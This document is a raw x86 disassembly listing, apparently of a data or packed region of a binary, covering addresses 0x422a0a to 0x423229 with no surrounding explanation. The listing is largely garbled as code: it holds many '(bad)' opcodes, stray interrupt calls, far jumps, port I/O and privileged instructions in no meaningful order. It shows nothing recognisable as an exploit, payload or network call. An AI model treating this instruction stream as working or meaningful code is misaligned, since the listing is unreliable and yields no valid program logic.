  422a0a:	test   al,0xcf
  422a0c:	fs adc ebx,0xffffffe9
  422a10:	mov    BYTE PTR [ebx+ecx*4-0x60],ah
  422a14:	iret   
  422a15:	int3   
  422a16:	call   0x80c278df
  422a1b:	jno    0x4229b5
  422a1d:	imul   eax,DWORD PTR [eax+0x70808081],0x548281d0
  422a27:	int    0xe6
  422a29:	std    
  422a2a:	xor    esp,esi
  422a2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422a2d:	das    
  422a2e:	pop    ecx
  422a2f:	push   0xffffffcd
  422a31:	(bad)  
  422a32:	or     eax,0xfcde9e3
  422a37:	sub    edi,eax
  422a39:	xchg   DWORD PTR [edi],ecx
  422a3b:	iret   
  422a3c:	les    ecx,FWORD PTR [ebp-0x6da04280]
  422a42:	add    BYTE PTR [eax-0x102c8233],0x88
  422a49:	add    al,0xf2
  422a4b:	add    DWORD PTR [ebx+0x2],0x80818069
  422a52:	adc    dh,0x4e
  422a55:	inc    ebx
  422a56:	jns    0x4229da
  422a58:	fldlg2 
  422a5a:	es int 0xc6
  422a5d:	or     eax,0x809221bd
  422a62:	add    al,0x81
  422a65:	mov    al,ds:0xfb87d287
  422a6a:	add    al,0xbd
  422a6c:	add    DWORD PTR [edi+ebp*8],0x436dcd81
  422a73:	jns    0x422a42
  422a75:	ins    DWORD PTR es:[edi],dx
  422a76:	and    ch,0xa0
  422a79:	push   edx
  422a7a:	add    al,0x3
  422a7c:	test   DWORD PTR [edx+0x2f8213cd],ecx
  422a82:	push   edx
  422a83:	add    al,0x3
  422a85:	push   ebx
  422a86:	mov    al,cl
  422a88:	test   bh,bh
  422a8a:	retf   
  422a8b:	add    BYTE PTR [ecx+eax*8+0x33cbff8b],0xe3
  422a93:	(bad)  
  422a94:	in     al,dx
  422a95:	outs   dx,DWORD PTR ds:[esi]
  422a96:	rcl    bl,1
  422a98:	(bad)  
  422a99:	jge    0x422a58
  422a9b:	outs   dx,DWORD PTR ds:[esi]
  422a9c:	xchg   edx,eax
  422a9d:	add    BYTE PTR [eax-0x5563eb2a],0xa0
  422aa4:	sahf   
  422aa5:	mov    al,ds:0x3454009e
  422aaa:	jno    0x422b0e
  422aac:	popa   
  422aad:	mov    ah,0x86
  422aaf:	add    BYTE PTR [eax+0x77ec80c1],0xd0
  422ab6:	push   cs
  422ab7:	(bad)  
  422ab8:	jge    0x422a77
  422aba:	push   eax
  422abb:	xchg   edx,eax
  422abc:	add    BYTE PTR [eax+0x2d048d6],0xff
  422ac3:	jge    0x422a82
  422ac5:	push   ss
  422ac6:	xchg   edx,eax
  422ac7:	add    BYTE PTR [eax+0x649c5bd6],0x8b
  422ace:	ror    BYTE PTR [ecx+0x53d09282],1
  422ad4:	jo     0x422aa3
  422ad6:	(bad)  
  422ad7:	std    
  422ad8:	xor    edx,esi
  422ada:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422adb:	inc    ebx
  422adc:	(bad)  
  422add:	xor    al,0x2f
  422adf:	or     esp,ebx
  422ae1:	add    DWORD PTR [eax-0x1932ba80],0xceeb41fd
  422aeb:	add    DWORD PTR [eax-0x42622f80],0x808081fa
  422af5:	int    0xd6
  422af7:	popf   
  422af8:	aam    0x23
  422afa:	shl    BYTE PTR [ebp-0x7f7e1143],1
  422b00:	or     ch,0xd6
  422b03:	xchg   ebp,eax
  422b04:	aam    0x89
  422b06:	int    0xd6
  422b08:	icebp  
  422b09:	int    0x8d
  422b0b:	xchg   ebp,eax
  422b0c:	or     cl,BYTE PTR [ebp-0x6272320f]
  422b12:	or     cl,BYTE PTR [ebp-0x5a72326b]
  422b18:	or     cl,BYTE PTR [ebp-0x5a29f563]
  422b1e:	pushf  
  422b1f:	stos   BYTE PTR es:[edi],al
  422b20:	sahf   
  422b21:	popa   
  422b22:	mov    esp,0xc180804a
  422b27:	mov    BYTE PTR [edi+0x649a62d9],al
  422b2d:	mov    ecx,edx
  422b2f:	rol    DWORD PTR [edx+0x70878492],cl
  422b35:	int    0xc6
  422b37:	or     eax,0x808169bd
  422b3c:	adc    dh,0x14
  422b3f:	int    0x76
  422b41:	mov    ebp,0xd30de6cd
  422b46:	lods   eax,DWORD PTR ds:[esi]
  422b47:	xchg   DWORD PTR [ebx],esi
  422b49:	retf   
  422b4a:	ror    BYTE PTR [eax+0x7ae4cfa8],0x84
  422b51:	in     al,dx
  422b52:	push   esi
  422b53:	int    0xc6
  422b55:	or     eax,0xbd92c704
  422b5a:	daa    
  422b5b:	add    DWORD PTR [eax-0x32e32980],0xe6cdbd76
  422b65:	or     eax,0xc087add3
  422b6a:	mov    BYTE PTR [esi-0x30577740],bl
  422b70:	gs jp  0x422af7
  422b73:	add    DWORD PTR [eax-0x3ccf1380],0x80809284
  422b7d:	xchg   esi,esp
  422b7f:	or     eax,0x699e30c0
  422b84:	add    BYTE PTR [ecx-0x72f57f80],0xb5
  422b8b:	xor    ebp,DWORD PTR [ebp+0x6c]
  422b8e:	int    0x10
  422b90:	mov    ebp,0x808081bc
  422b95:	int    0x7d
  422b97:	xor    ecx,DWORD PTR [edi]
  422b99:	xor    ah,0x81
  422b9c:	lea    esi,[ebp-0x7b8a19fc]
  422ba2:	das    
  422ba3:	add    al,0xd0
  422ba5:	add    BYTE PTR [eax+0x75760480],0x8b
  422bac:	int    0x8d
  422bae:	mov    ch,0x4
  422bb0:	cli    
  422bb1:	test   BYTE PTR [edx-0x61783f79],al
  422bb7:	int    0xe6
  422bb9:	jge    0x422b8e
  422bbb:	xacquire xchg BYTE PTR [ebx],dh
  422bbe:	ins    DWORD PTR es:[edi],dx
  422bbf:	ins    BYTE PTR es:[edi],dx
  422bc0:	shr    BYTE PTR [eax+ebp*4-0x31],0x65
  422bc5:	outs   dx,DWORD PTR ds:[esi]
  422bc6:	lods   al,BYTE PTR ds:[esi]
  422bc7:	xchg   DWORD PTR [eax-0x42ef3280],eax
  422bcd:	inc    esp
  422bce:	add    DWORD PTR [eax+0x337dcd80],0xaf4820f
  422bd8:	lea    edi,[ebp+0x4a58d0a]
  422bde:	cli    
  422bdf:	test   BYTE PTR [edx+0x402cd77],al
  422be5:	mov    dh,0xa5
  422be7:	and    ebx,0xa58d04ef
  422bed:	xchg   edx,eax
  422bee:	mov    es,WORD PTR [edx+edi*8]
  422bf1:	dec    esi
  422bf2:	ja     0x422c12
  422bf4:	pop    ebp
  422bf5:	rcl    DWORD PTR [edx-0x2ccc7f80],1
  422bfb:	int    0xf
  422bfd:	fidiv  DWORD PTR [esi-0x5a89785b]
  422c03:	jecxz  0x422bb2
  422c05:	xchg   DWORD PTR [esi+0x7d],esi
  422c08:	or     dh,BYTE PTR [esi+0xd]
  422c0b:	in     al,dx
  422c0c:	inc    esi
  422c0d:	add    al,0xef
  422c0f:	test   BYTE PTR [ebp-0x7f7f7fc9],bh
  422c15:	jecxz  0x422c03
  422c17:	jecxz  0x422bcf
  422c19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422c1a:	pop    esi
  422c1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422c1c:	lods   eax,DWORD PTR ds:[esi]
  422c1d:	add    BYTE PTR [esi+0x3ea57600],0xa6
  422c24:	lods   eax,DWORD PTR ds:[esi]
  422c25:	mov    ss,esi
  422c27:	mov    ebp,0x8086745d
  422c2c:	add    BYTE PTR [edi+0x760a7d76],0xd
  422c33:	shl    DWORD PTR [esi-0x7b3f7b5b],cl
  422c39:	test   al,0x33
  422c3b:	add    BYTE PTR [edx-0x33],bh
  422c3e:	leave  
  422c3f:	int    0xc6
  422c41:	or     eax,0x808059bd
  422c46:	cmp    BYTE PTR ds:0x8987d481,0xe6
  422c4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422c4e:	jecxz  0x422c39
  422c50:	mov    ss,esi
  422c52:	in     eax,dx
  422c53:	in     al,dx
  422c54:	add    BYTE PTR [eax],0x76
  422c57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422c58:	int    0x8d
  422c5a:	mov    ch,0x4
  422c5c:	rcl    DWORD PTR [edx-0x32021933],cl
  422c62:	leave  
  422c63:	xor    esi,DWORD PTR [esi+0x34]
  422c66:	pop    esi
  422c67:	jbe    0x422c0e
  422c69:	jnp    0x422bf5
  422c6b:	int    0xf8
  422c6d:	xor    edx,esi
  422c6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422c70:	int    0x96
  422c72:	cmp    al,0x45
  422c74:	inc    ecx
  422c75:	inc    ebx
  422c76:	add    esi,DWORD PTR [edi-0x79]
  422c79:	jle    0x422c51
  422c7b:	clc    
  422c7c:	or     ah,dh
  422c7e:	std    
  422c7f:	das    
  422c80:	pop    ecx
  422c81:	adc    DWORD PTR [ebx-0x1a],eax
  422c84:	cmp    al,0x2f
  422c86:	or     esp,DWORD PTR [edx-0x2]
  422c89:	add    BYTE PTR [eax],al
  422c8b:	mov    ebp,0x80808040
  422c90:	xor    ebp,DWORD PTR [ebp-0x31]
  422c93:	les    esi,FWORD PTR [esp+eiz*2]
  422c96:	int    0x96
  422c98:	sub    al,0xcd
  422c9a:	(bad)  
  422c9b:	stc    
  422c9c:	xor    edx,esi
  422c9e:	sbb    al,0xa
  422ca0:	inc    edx
  422ca1:	int    0x96
  422ca3:	inc    esp
  422ca4:	int    0xe6
  422ca6:	std    
  422ca7:	xor    esp,esi
  422ca9:	xor    al,0xa
  422cab:	pusha  
  422cac:	retf   
  422cad:	arpl   WORD PTR [eax-0x7fdb2d56],bp
  422cb3:	test   al,0x9c
  422cb5:	xor    ebp,DWORD PTR [ebp+0x6c]
  422cb8:	in     al,dx
  422cb9:	popf   
  422cba:	adc    bh,ah
  422cbc:	add    BYTE PTR [eax-0x7e7d7e80],0xc5
  422cc3:	shl    ebp,cl
  422cc5:	mov    BYTE PTR [eax+0x43f9d6cd],bl
  422ccb:	(bad)  
  422ccc:	and    al,0x77
  422cce:	mov    ch,0xcd
  422cd0:	jbe    0x422c7f
  422cd2:	shr    DWORD PTR [ebp+0x760a4588],cl
  422cd8:	lods   eax,DWORD PTR ds:[esi]
  422cd9:	or     dl,dh
  422cdb:	stc    
  422cdc:	test   al,0xc5
  422cde:	int    0x8d
  422ce0:	jne    0x422d11
  422ce2:	pop    ecx
  422ce3:	ins    DWORD PTR es:[edi],dx
  422ce4:	shl    edx,cl
  422ce6:	test   BYTE PTR [edi-0x2c78428a],al
  422cec:	in     al,dx
  422ced:	xchg   BYTE PTR [edi],ch
  422cef:	pop    ecx
  422cf0:	ins    DWORD PTR es:[edi],dx
  422cf1:	xchg   DWORD PTR [esi+0x75],esi
  422cf4:	int    0xc6
  422cf6:	jge    0x422cc7
  422cf8:	les    esi,FWORD PTR [esi-0x80]
  422cfb:	xor    ebp,DWORD PTR [ebp-0x31]
  422cfe:	les    esi,FWORD PTR [esi-0x80]
  422d01:	adc    bh,ah
  422d03:	add    BYTE PTR [eax+0x24778180],0xcd
  422d0a:	mov    WORD PTR [esp+ebx*2],?
  422d0d:	shl    DWORD PTR [esp+esi*1-0x73bc77d4],cl
  422d14:	xor    al,0xa4
  422d16:	ja     0x422d3d
  422d18:	retf   0x31
  422d1b:	je     0x422d51
  422d1d:	pop    esp
  422d1e:	shl    ebp,cl
  422d20:	mov    BYTE PTR [ecx],cl
  422d22:	xchg   esp,eax
  422d23:	xor    al,0x2c
  422d25:	int    0xc
  422d27:	das    
  422d28:	mov    ebx,0xebd38096
  422d2d:	push   ebx
  422d2e:	das    
  422d2f:	rcl    DWORD PTR [ebx],1
  422d31:	pop    esi
  422d32:	mov    WORD PTR [esp+ebp*1],?
  422d35:	ja     0x422d51
  422d37:	int    0xdb
  422d39:	pop    edi
  422d3a:	or     BYTE PTR [eax+0x13338080],0xd3
  422d41:	jmp    0x422cc8
  422d43:	mov    eax,0x87808d81
  422d48:	ins    DWORD PTR es:[edi],dx
  422d49:	iret   
  422d4a:	les    esi,FWORD PTR [esp+ebp*2]
  422d4d:	(bad)
  422d50:	test   DWORD PTR [esi],edi
  422d52:	mov    WORD PTR [esp+ebp*1],?
  422d55:	xor    ebx,ebx
  422d57:	mov    eax,0x8780963e
  422d5c:	ins    DWORD PTR es:[edi],dx
  422d5d:	add    al,0x6d
  422d5f:	or     edi,0xc56c34c4
  422d65:	cwde   
  422d66:	int    0xf0
  422d68:	mov    ebp,0xfcd9
  422d6d:	int    0xd9
  422d6f:	int    0xf
  422d71:	jns    0x422cf9
  422d73:	mov    bh,0xbd
  422d75:	sub    esp,edi
  422d77:	add    BYTE PTR [eax],al
  422d79:	cwde   
  422d7a:	int    0xf0
  422d7c:	jns    0x422df6
  422d7e:	test   DWORD PTR [ebx+0xfc6bbd],esp
  422d84:	add    BYTE PTR [eax-0x58798787],bl
  422d8a:	mov    ebp,0xfc38
  422d8f:	jns    0x422e09
  422d91:	xchg   edx,eax
  422d92:	cmp    eax,0xeceb99cd
  422d97:	add    eax,DWORD PTR [eax]
  422d99:	add    BYTE PTR [esi-0x12ed1233],dl
  422d9f:	inc    esp
  422da0:	add    DWORD PTR [eax-0x6893680],0x35862149
  422daa:	leave  
  422dab:	jbe    0x422d62
  422dad:	inc    ecx
  422dae:	and    DWORD PTR [esi-0x778932cb],eax
  422db4:	or     dh,BYTE PTR [esi-0x78]
  422db7:	int    0x76
  422db9:	stc    
  422dba:	int    0x96
  422dbc:	stc    
  422dbd:	pop    ebx
  422dbe:	cwde   
  422dbf:	call   0xd3e3:0x3b9effc0
  422dc6:	jmp    0x3586:0x21d1bf28
  422dcd:	cmp    eax,ebp
  422dcf:	sar    DWORD PTR [ebp+0xad25392],cl
  422dd5:	jbe    0x422e4c
  422dd7:	int    0x76
  422dd9:	stc    
  422dda:	int    0x96
  422ddc:	stc    
  422ddd:	cmp    eax,ebp
  422ddf:	sar    DWORD PTR [ebp-0x2c1cc46e],cl
  422de5:	jmp    0xfd76:0xad25328
  422dec:	int    0x76
  422dee:	stc    
  422def:	int    0x96
  422df1:	stc    
  422df2:	cmp    eax,ebp
  422df4:	sar    DWORD PTR [ebp-0x2c1cc46e],cl
  422dfa:	jmp    0xd076:0xad25328
  422e01:	int    0x76
  422e03:	stc    
  422e04:	int    0x96
  422e06:	stc    
  422e07:	cmp    eax,ebp
  422e09:	sar    DWORD PTR [ebp-0x2c1cc46e],cl
  422e0f:	jmp    0xbd76:0xad25328
  422e16:	leave  
  422e17:	jbe    0x422e46
  422e19:	dec    ecx
  422e1a:	and    DWORD PTR [ebp+esi*1+0x496576c9],eax
  422e21:	mov    al,ds:0x76c93586
  422e26:	and    eax,0x35862169
  422e2b:	sar    BYTE PTR [esp+ebx*4],0xa
  422e2f:	jbe    0x422e01
  422e31:	or     dh,BYTE PTR [esi-0x30]
  422e34:	sar    BYTE PTR [esp+ebx*4+0xad0760a],0x76
  422e3c:	ror    cl,1
  422e3e:	jbe    0x422e10
  422e40:	jo     0x422dc2
  422e42:	add    BYTE PTR [eax+0x78d076c9],0x80
  422e49:	add    BYTE PTR [eax-0x32068933],0x96
  422e50:	stc    
  422e51:	cmp    eax,ebp
  422e53:	cmp    esp,ebx
  422e55:	sar    DWORD PTR [ebp+0x28ead392],cl
  422e5b:	push   ebx
  422e5c:	ror    BYTE PTR [edx],cl
  422e5e:	jbe    0x422e30
  422e60:	int    0x76
  422e62:	stc    
  422e63:	int    0x96
  422e65:	stc    
  422e66:	cmp    eax,ebp
  422e68:	cmp    esp,ebx
  422e6a:	sar    DWORD PTR [ebp+0x28ead392],cl
  422e70:	push   ebx
  422e71:	ror    BYTE PTR [edx],cl
  422e73:	jbe    0x422e45
  422e75:	leave  
  422e76:	jbe    0x422e0d
  422e78:	arpl   WORD PTR [edx+0x76c98080],dx
  422e7e:	lods   eax,DWORD PTR ds:[esi]
  422e7f:	pop    esi
  422e80:	add    BYTE PTR [eax+0xd76c980],0xe6
  422e87:	add    BYTE PTR [eax-0xa983080],0xff
  422e8e:	add    BYTE PTR [eax],al
  422e90:	iret   
  422e91:	push   edi
  422e92:	xchg   ebp,eax
  422e93:	inc    DWORD PTR [eax]
  422e95:	add    BYTE PTR [ebp+0xff13],bh
  422e9b:	add    BYTE PTR [ebp+0xf3d60d],cl
  422ea1:	lea    ebp,[ebp-0x72ff562a]
  422ea7:	xchg   ebp,eax
  422ea8:	(bad)  
  422ea9:	fcmove st,st(1)
  422eab:	jbe    0x422e5a
  422ead:	dec    esi
  422eae:	ins    BYTE PTR es:[edi],dx
  422eaf:	add    BYTE PTR [eax-0x32068933],0x8d
  422eb6:	stc    
  422eb7:	cmp    eax,ebp
  422eb9:	sar    DWORD PTR [ebp-0x57003f6e],cl
  422ebf:	cmp    ecx,DWORD PTR [edi]
  422ec1:	shl    edx,cl
  422ec3:	sub    BYTE PTR [ebx-0x2d],dl
  422ec6:	or     dh,BYTE PTR [esi+0x6d]
  422ec9:	int    0x76
  422ecb:	stc    
  422ecc:	int    0x8d
  422ece:	stc    
  422ecf:	add    al,0xb6
  422ed1:	cmc    
  422ed2:	cmp    BYTE PTR [ebx],0xc5
  422ed5:	sar    DWORD PTR [ebp-0x2cf0c46e],cl
  422edb:	repnz sub BYTE PTR [ebx-0x2d],dl
  422edf:	or     dh,BYTE PTR [esi-0x6b]
  422ee2:	mov    ah,0xb1
  422ee4:	sbb    al,0x80
  422ee6:	add    BYTE PTR [eax-0x320a89f6],0x6c
  422eed:	push   eax
  422eee:	or     dh,BYTE PTR [esi-0x13]
  422ef1:	int    0x6c
  422ef3:	dec    esp
  422ef4:	or     dh,BYTE PTR [esi+0x11]
  422ef7:	int    0x76
  422ef9:	mov    bh,cl
  422efb:	(bad)  
  422efc:	cmc    
  422efd:	or     cl,BYTE PTR [ecx]
  422eff:	rol    BYTE PTR [ecx+0x76cd8080],1
  422f05:	mov    bh,cl
  422f07:	(bad)  
  422f08:	in     eax,dx
  422f09:	or     cl,BYTE PTR [ecx]
  422f0b:	push   ebp
  422f0c:	add    DWORD PTR [eax-0x77893280],0xcf88d600
  422f16:	lea    edx,[ecx]
  422f18:	or     cl,BYTE PTR [ecx]
  422f1a:	pop    ebp
  422f1b:	add    DWORD PTR [eax+0x3eccbd80],0x8dcd8080
  422f25:	stc    
  422f26:	int    0x96
  422f28:	stc    
  422f29:	cmp    ecx,DWORD PTR [ebx+edi*1]
  422f2c:	cdq    
  422f2d:	shr    ebx,cl
  422f2f:	xchg   edx,eax
  422f30:	shr    edx,cl
  422f32:	sub    BYTE PTR [ebx+0x13],dl
  422f35:	inc    ebx
  422f36:	jge    0x422f67
  422f38:	add    eax,0x808087ca
  422f3d:	int    0x76
  422f3f:	mov    ch,cl
  422f41:	add    DWORD PTR ds:0xcd808081,esi
  422f47:	mov    ch,cl
  422f49:	jbe    0x422ed3
  422f4b:	int    0x1
  422f4d:	xor    eax,0xcd808081
  422f52:	add    BYTE PTR [edi-0x72329b92],0x88
  422f59:	int    0xa
  422f5b:	adc    DWORD PTR [ecx+0x17cf8080],eax
  422f61:	adc    al,0x0
  422f63:	add    BYTE PTR [eax],al
  422f65:	(bad)  
  422f66:	int    0x96
  422f68:	mov    ch,cl
  422f6a:	mov    ds:0x80808125,al
  422f6f:	int    0x22
  422f71:	xchg   DWORD PTR [eax-0x7f7f7ff7],esi
  422f77:	rol    BYTE PTR [eax+eax*1-0x7f7f3330],0x80
  422f7f:	bound  eax,QWORD PTR [eax]
  422f81:	jno    0x422fa7
  422f83:	cmp    ebp,DWORD PTR [ebp-0x37]
  422f86:	push   es
  422f87:	push   esp
  422f88:	add    BYTE PTR [eax],al
  422f8a:	add    BYTE PTR [esi],cl
  422f8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422f8d:	aad    0x49
  422f8f:	leave  
  422f90:	push   es
  422f91:	pop    esp
  422f92:	add    BYTE PTR [eax],al
  422f94:	add    BYTE PTR [edi+0x35],dl
  422f97:	adc    ebp,DWORD PTR [ebx+0x6406c9]
  422f9d:	add    BYTE PTR [eax],al
  422f9f:	mov    ds:0x79d735c1,eax
  422fa4:	push   es
  422fa5:	ins    BYTE PTR es:[edi],dx
  422fa6:	add    BYTE PTR [eax],al
  422fa8:	add    BYTE PTR [eax],bl
  422faa:	iret   
  422fab:	outs   dx,BYTE PTR ds:[si]
  422fad:	add    BYTE PTR [eax],al
  422faf:	add    BYTE PTR [edi+0x3b41afb8],ch
  422fb5:	ins    DWORD PTR es:[edi],dx
  422fb6:	leave  
  422fb7:	push   es
  422fb8:	sub    al,0x0
  422fba:	add    BYTE PTR [eax],al
  422fbc:	push   cs
  422fbd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422fbe:	aad    0x49
  422fc0:	leave  
  422fc1:	push   es
  422fc2:	xor    al,0x0
  422fc4:	add    BYTE PTR [eax],al
  422fc6:	push   edi
  422fc7:	xor    eax,0x6c9ab13
  422fcc:	cmp    al,0x0
  422fce:	add    BYTE PTR [eax],al
  422fd0:	mov    ds:0x79c335c1,eax
  422fd5:	push   es
  422fd6:	inc    esp
  422fd7:	add    BYTE PTR [eax],al
  422fd9:	add    BYTE PTR [eax],bl
  422fdb:	iret   
  422fdc:	addr16 inc esi
  422fde:	add    BYTE PTR [eax],al
  422fe0:	add    BYTE PTR [edi-0x32be5048],ch
  422fe6:	jbe    0x422f70
  422fe8:	int    0x1
  422fea:	adc    DWORD PTR [ecx-0x19327f80],eax
  422ff0:	mov    BYTE PTR [ebp*2+0x35760a30],al
  422ff7:	int    0x76
  422ff9:	mov    ch,cl
  422ffb:	add    DWORD PTR [ebp-0x7f],edi
  422ffe:	add    BYTE PTR [eax+0x410176c9],0xa7
  423005:	mov    dl,0x35
  423007:	leave  
  423008:	jbe    0x42300f
  42300a:	mov    bh,0x3f
  42300c:	cmp    DWORD PTR [edi-0x48],eax
  42300f:	leave  
  423010:	jbe    0x42301b
  423012:	xlat   BYTE PTR ds:[ebx]
  423013:	sbb    cl,cl
  423015:	push   es
  423016:	les    eax,FWORD PTR [eax]
  423018:	add    BYTE PTR [eax],al
  42301a:	push   cs
  42301b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42301c:	aad    0x49
  42301e:	leave  
  42301f:	push   es
  423020:	nop
  423021:	add    BYTE PTR [eax],al
  423023:	add    BYTE PTR [edi+0x35],dl
  423026:	xlat   BYTE PTR ds:[ebx]
  423027:	inc    ecx
  423028:	leave  
  423029:	push   es
  42302a:	aam    0x0
  42302c:	add    BYTE PTR [eax],al
  42302e:	cmp    DWORD PTR [ecx+0x57],ecx
  423031:	jge    0x422ffc
  423033:	push   es
  423034:	fadd   QWORD PTR [eax]
  423036:	add    BYTE PTR [eax],al
  423038:	mov    cl,0x3f
  42303a:	shl    DWORD PTR ds:0xe406c9,0x0
  423041:	add    BYTE PTR [edi-0x49],al
  423044:	xlat   BYTE PTR ds:[ebx]
  423045:	sbb    cl,cl
  423047:	push   es
  423048:	pushf  
  423049:	add    BYTE PTR [eax],al
  42304b:	add    BYTE PTR [esi],cl
  42304d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42304e:	aad    0x49
  423050:	leave  
  423051:	push   es
  423052:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423053:	add    BYTE PTR [eax],al
  423055:	add    BYTE PTR [edi+0x35],dl
  423058:	xlat   BYTE PTR ds:[ebx]
  423059:	inc    ecx
  42305a:	leave  
  42305b:	push   es
  42305c:	lods   al,BYTE PTR ds:[esi]
  42305d:	add    BYTE PTR [eax],al
  42305f:	add    BYTE PTR [ecx],bh
  423061:	dec    ecx
  423062:	push   edi
  423063:	jge    0x42302e
  423065:	push   es
  423066:	mov    ah,0x0
  423068:	add    BYTE PTR [eax],al
  42306a:	mov    cl,0x3f
  42306c:	shl    DWORD PTR ds:0xbc06c9,0x0
  423073:	add    BYTE PTR [edi-0x49],al
  423076:	ret    
  423077:	sbb    BYTE PTR [ebp-0x7f7fc39d],bh
  42307d:	jo     0x42304c
  42307f:	jbe    0x4230b6
  423081:	add    BYTE PTR [eax],dh
  423083:	int    0x76
  423085:	stc    
  423086:	int    0x8d
  423088:	stc    
  423089:	cmp    eax,ebp
  42308b:	cmp    ecx,DWORD PTR [edi]
  42308d:	shl    edx,cl
  42308f:	sub    bl,dl
  423091:	mov    ebp,0xcdd35392
  423096:	lea    ebp,[ebp+0x52fd343]
  42309c:	test   BYTE PTR [ecx+0x76cd8080],0xb5
  4230a3:	int    0x8d
  4230a5:	mov    ch,0x3b
  4230a7:	lds    edi,FWORD PTR [ebx]
  4230a9:	psrlq  mm6,mm2
  4230ac:	sub    bl,dl
  4230ae:	mov    ebp,0xcdd35392
  4230b3:	lea    ebp,[ebp+0x76cd7d33]
  4230b9:	ins    DWORD PTR es:[edi],dx
  4230ba:	inc    ebx
  4230bb:	shr    DWORD PTR [edi],cl
  4230bd:	or     ch,dl
  4230bf:	add    DWORD PTR [eax+0x3d76c980],0x80808080
  4230c9:	int    0x76
  4230cb:	mov    ch,cl
  4230cd:	rcl    BYTE PTR [ecx],1
  4230cf:	add    DWORD PTR [eax-0x77193280],0xcd8876cd
  4230d9:	add    DWORD PTR [ebp-0x7f],esi
  4230dc:	add    BYTE PTR [eax-0x7fc50943],0x80
  4230e3:	jo     0x4230e5
  4230e5:	cwde   
  4230e6:	xor    ch,cl
  4230e8:	lea    ecx,[eax-0x7ebaf533]
  4230ee:	add    BYTE PTR [eax+0x76cd810a],0x88
  4230f5:	int    0x5d
  4230f7:	adc    DWORD PTR [ecx-0x29327f80],eax
  4230fd:	mov    BYTE PTR [ebx],bh
  4230ff:	ins    DWORD PTR es:[edi],dx
  423100:	iret   
  423101:	pop    ss
  423102:	pushf  
  423103:	add    BYTE PTR [eax],al
  423105:	add    BYTE PTR [ebp-0x7f7fc36e],bh
  42310b:	jo     0x4230da
  42310d:	jbe    0x423097
  42310f:	int    0x1
  423111:	inc    ebp
  423112:	add    DWORD PTR [eax+0x500080],0x760a889a
  42311c:	adc    eax,0xcd8876cd
  423121:	pop    ebp
  423122:	adc    DWORD PTR [ecx-0x29327f80],eax
  423128:	mov    BYTE PTR [ebx],bh
  42312a:	ins    DWORD PTR es:[edi],dx
  42312b:	iret   
  42312c:	pop    ss
  42312d:	les    eax,FWORD PTR [eax]
  42312f:	add    BYTE PTR [eax],al
  423131:	mov    ebp,0x80803ad9
  423136:	jo     0x423105
  423138:	jbe    0x4230c2
  42313a:	int    0x1
  42313c:	inc    ebp
  42313d:	add    DWORD PTR [eax+0x500080],0x76cd889a
  423147:	mov    ch,cl
  423149:	pop    ebp
  42314a:	adc    DWORD PTR [ecx-0x29327f80],eax
  423150:	mov    BYTE PTR [ebx],bh
  423152:	ins    DWORD PTR es:[edi],dx
  423153:	iret   
  423154:	pop    ss
  423155:	push   esp
  423156:	add    BYTE PTR [eax],al
  423158:	add    BYTE PTR [ebp-0x7f7fc52f],bh
  42315e:	jo     0x42312d
  423160:	jbe    0x4230ea
  423162:	int    0x1
  423164:	inc    ebp
  423165:	add    DWORD PTR [eax+0x500080],0xb604889a
  42316f:	pop    ebp
  423170:	or     BYTE PTR [edx],0x76
  423173:	xor    eax,0xc05d76cd
  423178:	push   ds
  423179:	cmp    ebx,edx
  42317b:	sahf   
  42317c:	clc    
  42317d:	add    al,BYTE PTR [ecx]
  42317f:	shr    BYTE PTR [esi+0x2f],cl
  423182:	pop    ecx
  423183:	shl    BYTE PTR [eax+0x0],cl
  423186:	xchg   esi,eax
  423187:	xor    eax,0x43d66d06
  42318c:	int    0x76
  42318e:	pop    ebp
  42318f:	add    al,0xad
  423191:	mov    eax,DWORD PTR [ebp*2-0x69ff8faf]
  423198:	adc    eax,0x40d46d06
  42319d:	int    0x76
  42319f:	mov    ch,cl
  4231a1:	pop    ebp
  4231a2:	adc    DWORD PTR [ecx-0x29327f80],eax
  4231a8:	mov    BYTE PTR [ebx],bh
  4231aa:	ins    DWORD PTR es:[edi],dx
  4231ab:	iret   
  4231ac:	xchg   esi,eax
  4231ad:	add    DWORD PTR [ebp-0x7f7fc560],edi
  4231b3:	jo     0x423182
  4231b5:	jbe    0x42313f
  4231b7:	int    0x1
  4231b9:	cmp    eax,0x808081
  4231be:	push   eax
  4231bf:	add    BYTE PTR [edx+0xd760a88],bl
  4231c5:	in     al,dx
  4231c6:	test   BYTE PTR [esi+esi*4],al
  4231c9:	or     eax,0x5d760080
  4231ce:	add    al,0xe6
  4231d0:	pop    ebp
  4231d1:	sub    al,0x82
  4231d3:	sub    eax,0xcdb576cd
  4231d8:	lea    esi,[ebp-0x3f772933]
  4231de:	jmp    FWORD PTR [edx-0xfc43ac5]
  4231e4:	sar    DWORD PTR [ebp+0x28f2d392],cl
  4231ea:	push   ebx
  4231eb:	ror    edi,cl
  4231ed:	pop    ss
  4231ee:	cmc    
  4231ef:	inc    DWORD PTR [eax]
  4231f1:	add    BYTE PTR [ebp-0x7f7fc5e8],bh
  4231f7:	jo     0x4231c6
  4231f9:	jbe    0x4231f4
  4231fb:	int    0x8d
  4231fd:	stc    
  4231fe:	int    0xd6
  423200:	mov    BYTE PTR [ebx],bh
  423202:	lds    edi,FWORD PTR [ebx]
  423204:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  42320b:	push   ebx
  42320c:	ror    edi,cl
  42320e:	pop    ss
  42320f:	xchg   ebp,eax
  423210:	inc    DWORD PTR [eax]
  423212:	add    BYTE PTR [ebp-0x7f7fc70a],bh
  423218:	jo     0x42321a
  42321a:	xchg   esi,eax
  42321b:	or     eax,0xcdf98dcd
  423220:	xchg   esi,eax
  423221:	stc    
  423222:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423225:	(bad)  
  423227:	jmp    0x4231bb
  423229:	shr    edx,cl
